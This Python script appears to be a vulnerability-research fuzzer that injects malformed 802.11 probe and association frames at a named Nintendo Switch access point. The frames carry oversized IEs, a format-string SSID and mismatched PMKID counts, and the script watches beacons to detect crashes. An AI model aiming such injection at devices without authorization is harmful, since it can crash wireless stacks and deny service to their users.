#!/usr/bin/env python3
"""
WiFi management frame injection tool for Switch LDN research (CVE-2026-82079).

Sends crafted 802.11 management frames (probe requests, association requests)
to the Switch "Send to Smartphone" AP to test for buffer overflow conditions
in the local wireless stack.

Requires:
    - scapy (pip install scapy)
    - Root privileges (sudo)
    - WiFi interface that supports monitor mode + injection (Intel AX210 / iwlwifi)

Usage:
    # Create monitor interface and run all tests:
    sudo python3 -I wifi_frame_inject.py --iface wlp5s0

    # Run only probe request tests:
    sudo python3 -I wifi_frame_inject.py --iface wlp5s0 --tests probe

    # Run only association tests:
    sudo python3 -I wifi_frame_inject.py --iface wlp5s0 --tests assoc

    # Use an existing monitor interface:
    sudo python3 -I wifi_frame_inject.py --mon-iface wlp5s0mon --skip-setup

    # Dry run (build frames, don't send):
    sudo python3 -I wifi_frame_inject.py --iface wlp5s0 --dry-run

The script creates a virtual monitor interface (default: wlp5s0mon), sets it to
channel 1, and tears it down on exit. Each test checks whether the Switch AP is
still beaconing after injection — a missing beacon response signals a possible
crash worth investigating.

Target AP:
    SSID:    switch_F3DCDB0100S
    BSSID:   EC:C4:0D:F3:DC:DB
    Channel: 1

All results saved to ../evidence/wifi_inject_results/
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp,
        Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas,
        RadioTap, sendp, sniff, conf, RandMAC,
    )
except ImportError:
    print("scapy is required: pip install scapy")
    sys.exit(1)

SWITCH_BSSID = "ec:c4:0d:f3:dc:db"
SWITCH_SSID = "switch_F3DCDB0100S"
SWITCH_CHANNEL = 1
NINTENDO_OUI = b"\x00\x22\xaa"
BEACON_WAIT = 1.5  # seconds to listen for a beacon
INTER_TEST_PAUSE = 0.5

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "wifi_inject_results"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def save_result(name: str, data: dict):
    path = evidence_dir() / f"{name}.json"
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)


def log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ═══════════════════════════════════════════════════════════
# Monitor interface management
# ═══════════════════════════════════════════════════════════

def run_cmd(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, check=check)


def setup_monitor(phy_iface: str, mon_iface: str) -> bool:
    """Create a monitor-mode virtual interface on the same phy."""
    log(f"Setting up monitor interface {mon_iface} from {phy_iface}")

    # Find the phy for this interface
    try:
        result = run_cmd(["iw", "dev", phy_iface, "info"])
        phy = None
        for line in result.stdout.splitlines():
            if "wiphy" in line:
                phy = "phy" + line.strip().split()[-1]
                break
        if not phy:
            log(f"  Could not determine phy for {phy_iface}")
            return False
    except subprocess.CalledProcessError:
        log(f"  iw dev {phy_iface} info failed")
        return False

    # Delete existing mon interface if present
    run_cmd(["iw", "dev", mon_iface, "del"], check=False)

    # Create monitor interface
    try:
        run_cmd(["iw", phy, "interface", "add", mon_iface, "type", "monitor"])
    except subprocess.CalledProcessError as e:
        log(f"  Failed to create monitor interface: {e.stderr}")
        return False

    # Bring it up and set channel
    try:
        run_cmd(["ip", "link", "set", mon_iface, "up"])
        run_cmd(["iw", "dev", mon_iface, "set", "channel", str(SWITCH_CHANNEL)])
    except subprocess.CalledProcessError as e:
        log(f"  Failed to configure {mon_iface}: {e.stderr}")
        return False

    log(f"  ✓ {mon_iface} up on channel {SWITCH_CHANNEL}")
    return True


def teardown_monitor(mon_iface: str):
    log(f"Tearing down {mon_iface}")
    run_cmd(["ip", "link", "set", mon_iface, "down"], check=False)
    run_cmd(["iw", "dev", mon_iface, "del"], check=False)


# ═══════════════════════════════════════════════════════════
# AP liveness check
# ═══════════════════════════════════════════════════════════

def check_ap_alive(mon_iface: str, timeout: float = BEACON_WAIT) -> dict:
    """Listen for a beacon from the Switch AP. Returns detection info."""
    result = {"alive": False, "beacon_seen": False, "elapsed": 0.0}
    t0 = time.monotonic()

    def is_switch_beacon(pkt):
        if pkt.haslayer(Dot11Beacon):
            if pkt[Dot11].addr2 and pkt[Dot11].addr2.lower() == SWITCH_BSSID:
                return True
        return False

    try:
        pkts = sniff(iface=mon_iface, timeout=timeout,
                     lfilter=is_switch_beacon, count=1)
        result["elapsed"] = round(time.monotonic() - t0, 4)
        if pkts:
            result["alive"] = True
            result["beacon_seen"] = True
    except Exception as e:
        result["error"] = str(e)
        result["elapsed"] = round(time.monotonic() - t0, 4)

    return result


def wait_for_response(mon_iface: str, src_mac: str, timeout: float = 1.0) -> dict:
    """Listen for any response addressed to our spoofed MAC."""
    result = {"got_response": False, "frame_type": None, "frame_subtype": None}

    def is_response_to_us(pkt):
        if pkt.haslayer(Dot11):
            da = pkt[Dot11].addr1
            if da and da.lower() == src_mac.lower():
                return True
        return False

    try:
        pkts = sniff(iface=mon_iface, timeout=timeout,
                     lfilter=is_response_to_us, count=1)
        if pkts:
            pkt = pkts[0]
            result["got_response"] = True
            result["frame_type"] = pkt[Dot11].type
            result["frame_subtype"] = pkt[Dot11].subtype
            if pkt.haslayer(Dot11ProbeResp):
                result["frame_desc"] = "ProbeResponse"
            elif pkt.haslayer(Dot11AssoResp):
                result["frame_desc"] = "AssocResponse"
            elif pkt.haslayer(Dot11Deauth):
                result["frame_desc"] = "Deauth"
                result["reason"] = pkt[Dot11Deauth].reason
            elif pkt.haslayer(Dot11Disas):
                result["frame_desc"] = "Disassoc"
                result["reason"] = pkt[Dot11Disas].reason
            else:
                result["frame_desc"] = f"type={pkt[Dot11].type}/subtype={pkt[Dot11].subtype}"
    except Exception as e:
        result["error"] = str(e)

    return result


# ═══════════════════════════════════════════════════════════
# Frame builders
# ═══════════════════════════════════════════════════════════

def random_mac() -> str:
    """Generate a random locally-administered unicast MAC."""
    import random
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
    return ":".join(f"{b:02x}" for b in octets)


def build_probe_request(src_mac: str, ssid: str = SWITCH_SSID,
                        extra_ies: list | None = None) -> bytes:
    """Build a Dot11 probe request frame."""
    frame = (
        RadioTap()
        / Dot11(type=0, subtype=4,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=src_mac,
                addr3="ff:ff:ff:ff:ff:ff")
        / Dot11ProbeReq()
        / Dot11Elt(ID=0, info=ssid.encode() if isinstance(ssid, str) else ssid)
        / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")  # supported rates
    )
    if extra_ies:
        for ie in extra_ies:
            frame = frame / ie
    return frame


def build_assoc_request(src_mac: str, extra_ies: list | None = None) -> bytes:
    """Build a Dot11 association request frame."""
    frame = (
        RadioTap()
        / Dot11(type=0, subtype=0,
                addr1=SWITCH_BSSID,
                addr2=src_mac,
                addr3=SWITCH_BSSID)
        / Dot11AssoReq(cap=0x1105, listen_interval=10)
        / Dot11Elt(ID=0, info=SWITCH_SSID.encode())
        / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
    )
    if extra_ies:
        for ie in extra_ies:
            frame = frame / ie
    return frame


# ═══════════════════════════════════════════════════════════
# Test cases
# ═══════════════════════════════════════════════════════════

def probe_tests() -> list[tuple[str, object]]:
    """Generate all probe request test cases. Returns [(name, frame), ...]."""
    tests = []

    # --- Baseline ---
    mac = random_mac()
    tests.append(("probe_baseline", build_probe_request(mac)))

    # --- Oversized SSID (>32 bytes) ---
    mac = random_mac()
    tests.append(("probe_ssid_64B",
                  build_probe_request(mac, ssid="A" * 64)))

    # --- Oversized SSID (255 bytes = max IE length) ---
    mac = random_mac()
    tests.append(("probe_ssid_255B",
                  build_probe_request(mac, ssid="B" * 255)))

    # --- SSID with null bytes ---
    mac = random_mac()
    tests.append(("probe_ssid_nulls",
                  build_probe_request(mac, ssid=b"\x00" * 32 + SWITCH_SSID.encode())))

    # --- Directed probe to Switch SSID with extra Nintendo vendor IE ---
    mac = random_mac()
    nintendo_ie = Dot11Elt(ID=221, info=NINTENDO_OUI + b"\x10" + b"\x01\x01")
    tests.append(("probe_nintendo_ie_normal",
                  build_probe_request(mac, extra_ies=[nintendo_ie])))

    # --- Oversized Nintendo vendor IE (255 bytes) ---
    mac = random_mac()
    nintendo_ie_big = Dot11Elt(ID=221, info=NINTENDO_OUI + b"\x10" + b"\xCC" * 248)
    tests.append(("probe_nintendo_ie_255B",
                  build_probe_request(mac, extra_ies=[nintendo_ie_big])))

    # --- Malformed RSN IE (too short) ---
    mac = random_mac()
    rsn_short = Dot11Elt(ID=48, info=b"\x01\x00")  # just version, missing ciphers
    tests.append(("probe_rsn_truncated",
                  build_probe_request(mac, extra_ies=[rsn_short])))

    # --- RSN IE with large PMKID list ---
    mac = random_mac()
    rsn_base = (
        b"\x01\x00"              # version 1
        b"\x00\x0f\xac\x04"     # group cipher CCMP
        b"\x01\x00"              # 1 pairwise cipher
        b"\x00\x0f\xac\x04"     # pairwise CCMP
        b"\x01\x00"              # 1 AKM
        b"\x00\x0f\xac\x02"     # AKM PSK
        b"\x0c\x00"              # RSN capabilities
    )
    # Claim 8 PMKIDs (8 * 16 = 128 bytes) — fits in IE 255 limit
    pmkid_count = b"\x08\x00"  # 8 PMKIDs
    pmkid_data = b"\xAA" * (8 * 16)
    rsn_big = Dot11Elt(ID=48, info=rsn_base + pmkid_count + pmkid_data)
    tests.append(("probe_rsn_8_pmkids",
                  build_probe_request(mac, extra_ies=[rsn_big])))

    # --- Many IEs (fill toward frame max) ---
    mac = random_mac()
    many_ies = []
    for i in range(50):
        many_ies.append(Dot11Elt(ID=221, info=bytes([0x00, 0x50, 0xf2, i & 0xFF]) + b"\xDD" * 40))
    tests.append(("probe_50_vendor_ies",
                  build_probe_request(mac, extra_ies=many_ies)))

    # --- Extended SSID with format string characters ---
    mac = random_mac()
    tests.append(("probe_ssid_fmtstr",
                  build_probe_request(mac, ssid="%s%s%s%s%s%n%n%n")))

    # --- Probe with Broadcom vendor IE (matching Switch chip OUI) ---
    mac = random_mac()
    broadcom_ie = Dot11Elt(ID=221, info=b"\x00\x10\x18" + b"\x02" + b"\xEE" * 200)
    tests.append(("probe_broadcom_ie_200B",
                  build_probe_request(mac, extra_ies=[broadcom_ie])))

    return tests


def assoc_tests() -> list[tuple[str, object]]:
    """Generate association request test cases."""
    tests = []

    # --- Baseline ---
    mac = random_mac()
    rsn_normal = Dot11Elt(ID=48, info=(
        b"\x01\x00"
        b"\x00\x0f\xac\x04"
        b"\x01\x00"
        b"\x00\x0f\xac\x04"
        b"\x01\x00"
        b"\x00\x0f\xac\x02"
        b"\x0c\x00"
    ))
    tests.append(("assoc_baseline",
                  build_assoc_request(mac, extra_ies=[rsn_normal])))

    # --- Oversized supported rates (>8, normally capped at 8) ---
    mac = random_mac()
    big_rates = Dot11Elt(ID=1, info=bytes(range(0x80, 0x80 + 50)))
    frame = (
        RadioTap()
        / Dot11(type=0, subtype=0,
                addr1=SWITCH_BSSID, addr2=mac, addr3=SWITCH_BSSID)
        / Dot11AssoReq(cap=0x1105, listen_interval=10)
        / Dot11Elt(ID=0, info=SWITCH_SSID.encode())
        / big_rates
        / rsn_normal
    )
    tests.append(("assoc_50_rates", frame))

    # --- RSN with claimed 255 PMKIDs (but truncated data) ---
    mac = random_mac()
    rsn_lie = Dot11Elt(ID=48, info=(
        b"\x01\x00"
        b"\x00\x0f\xac\x04"
        b"\x01\x00"
        b"\x00\x0f\xac\x04"
        b"\x01\x00"
        b"\x00\x0f\xac\x02"
        b"\x0c\x00"
        b"\xff\x00"  # claim 255 PMKIDs
        + b"\xBB" * 32  # but only provide 2 PMKIDs worth
    ))
    tests.append(("assoc_rsn_pmkid_mismatch",
                  build_assoc_request(mac, extra_ies=[rsn_lie])))

    # --- Oversized Nintendo vendor IE in assoc ---
    mac = random_mac()
    nintendo_ie_max = Dot11Elt(ID=221, info=NINTENDO_OUI + b"\x10" + b"\xFF" * 248)
    tests.append(("assoc_nintendo_ie_max",
                  build_assoc_request(mac, extra_ies=[rsn_normal, nintendo_ie_max])))

    # --- Multiple conflicting RSN IEs ---
    mac = random_mac()
    rsn2 = Dot11Elt(ID=48, info=(
        b"\x01\x00"
        b"\x00\x0f\xac\x02"  # TKIP group
        b"\x01\x00"
        b"\x00\x0f\xac\x02"  # TKIP pairwise
        b"\x01\x00"
        b"\x00\x0f\xac\x01"  # 802.1X AKM
        b"\x00\x00"
    ))
    tests.append(("assoc_dual_rsn",
                  build_assoc_request(mac, extra_ies=[rsn_normal, rsn2])))

    # --- Extended Capabilities IE (large) ---
    mac = random_mac()
    ext_cap = Dot11Elt(ID=127, info=b"\xff" * 200)
    tests.append(("assoc_extcap_200B",
                  build_assoc_request(mac, extra_ies=[rsn_normal, ext_cap])))

    return tests


# ═══════════════════════════════════════════════════════════
# Test runner
# ═══════════════════════════════════════════════════════════

def run_test(name: str, frame, mon_iface: str, dry_run: bool = False) -> dict:
    """Send a frame and check AP liveness. Returns result dict."""
    src_mac = frame[Dot11].addr2 if frame.haslayer(Dot11) else "unknown"
    frame_bytes = bytes(frame)

    result = {
        "name": name,
        "src_mac": src_mac,
        "frame_size": len(frame_bytes),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    if dry_run:
        result["dry_run"] = True
        log(f"  [DRY] {name}: {len(frame_bytes)}B frame, src={src_mac}")
        return result

    # Send the frame
    try:
        sendp(frame, iface=mon_iface, verbose=False)
        result["sent"] = True
    except Exception as e:
        result["sent"] = False
        result["send_error"] = str(e)
        log(f"  ✗ {name}: send failed: {e}")
        return result

    # Listen for a direct response to our MAC
    response = wait_for_response(mon_iface, src_mac, timeout=1.0)
    result["response"] = response

    # Check AP is still alive (beaconing)
    time.sleep(INTER_TEST_PAUSE)
    liveness = check_ap_alive(mon_iface)
    result["ap_alive_after"] = liveness["alive"]

    if not liveness["alive"]:
        log(f"  ⚠ {name}: AP NOT beaconing after injection! Possible crash!")
        result["possible_crash"] = True
    else:
        resp_desc = response.get("frame_desc", "none")
        log(f"  ✓ {name}: {len(frame_bytes)}B → response={resp_desc}, AP alive")

    return result


def run_suite(test_cases: list, suite_name: str, mon_iface: str,
              dry_run: bool = False) -> list[dict]:
    """Run a suite of tests, stopping early if the AP crashes."""
    log(f"\n{'═' * 50}")
    log(f"Suite: {suite_name} ({len(test_cases)} tests)")
    log(f"{'═' * 50}")

    # Pre-check: AP must be alive
    if not dry_run:
        liveness = check_ap_alive(mon_iface)
        if not liveness["alive"]:
            log("AP not detected — is the Switch in 'Send to Smartphone' mode?")
            return [{"error": "AP not detected before suite start"}]

    results = []
    for name, frame in test_cases:
        result = run_test(name, frame, mon_iface, dry_run)
        results.append(result)

        if result.get("possible_crash"):
            log("Stopping suite — AP may have crashed")
            # Double-check with a longer wait
            time.sleep(3)
            recheck = check_ap_alive(mon_iface, timeout=3.0)
            result["recheck_alive"] = recheck["alive"]
            if recheck["alive"]:
                log("  AP recovered — continuing")
            else:
                log("  AP still down — stopping suite")
                break

    save_result(suite_name, {
        "suite": suite_name,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "mon_iface": mon_iface,
        "dry_run": dry_run,
        "tests": results,
        "summary": {
            "total": len(results),
            "sent": sum(1 for r in results if r.get("sent")),
            "responses": sum(1 for r in results if r.get("response", {}).get("got_response")),
            "possible_crashes": sum(1 for r in results if r.get("possible_crash")),
        }
    })

    return results


# ═══════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="WiFi frame injection tool for Switch LDN research (CVE-2026-82079)")
    parser.add_argument("--iface", default="wlp5s0",
                        help="Physical WiFi interface (default: wlp5s0)")
    parser.add_argument("--mon-iface", default=None,
                        help="Monitor interface name (default: <iface>mon)")
    parser.add_argument("--skip-setup", action="store_true",
                        help="Don't create/destroy monitor interface (use existing)")
    parser.add_argument("--tests", choices=["all", "probe", "assoc"], default="all",
                        help="Which test suites to run (default: all)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build frames but don't inject")
    args = parser.parse_args()

    if os.geteuid() != 0 and not args.dry_run:
        print("This script requires root. Run with sudo.")
        sys.exit(1)

    mon_iface = args.mon_iface or (args.iface + "mon")
    created_mon = False

    # Suppress scapy warnings
    conf.verb = 0

    def cleanup(signum=None, frame=None):
        if created_mon and not args.skip_setup:
            teardown_monitor(mon_iface)
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("Switch LDN WiFi Frame Injection Tool")
    log(f"Target: {SWITCH_SSID} ({SWITCH_BSSID}) channel {SWITCH_CHANNEL}")
    log(f"Interface: {args.iface} → {mon_iface}")

    if not args.skip_setup and not args.dry_run:
        if not setup_monitor(args.iface, mon_iface):
            log("Failed to set up monitor interface")
            sys.exit(1)
        created_mon = True

    try:
        all_results = {}

        if args.tests in ("all", "probe"):
            cases = probe_tests()
            all_results["probe"] = run_suite(cases, "probe_requests", mon_iface,
                                             dry_run=args.dry_run)

        if args.tests in ("all", "assoc"):
            cases = assoc_tests()
            all_results["assoc"] = run_suite(cases, "assoc_requests", mon_iface,
                                             dry_run=args.dry_run)

        # Summary
        log(f"\n{'═' * 50}")
        log("FINAL SUMMARY")
        total_crashes = 0
        for suite_name, results in all_results.items():
            crashes = sum(1 for r in results if r.get("possible_crash"))
            total_crashes += crashes
            log(f"  {suite_name}: {len(results)} tests, {crashes} possible crashes")
        log(f"  Total possible crashes: {total_crashes}")
        if total_crashes:
            log("  ⚠ Review results in evidence/wifi_inject_results/")
        log(f"{'═' * 50}")

    finally:
        if created_mon and not args.skip_setup:
            teardown_monitor(mon_iface)


if __name__ == "__main__":
    main()
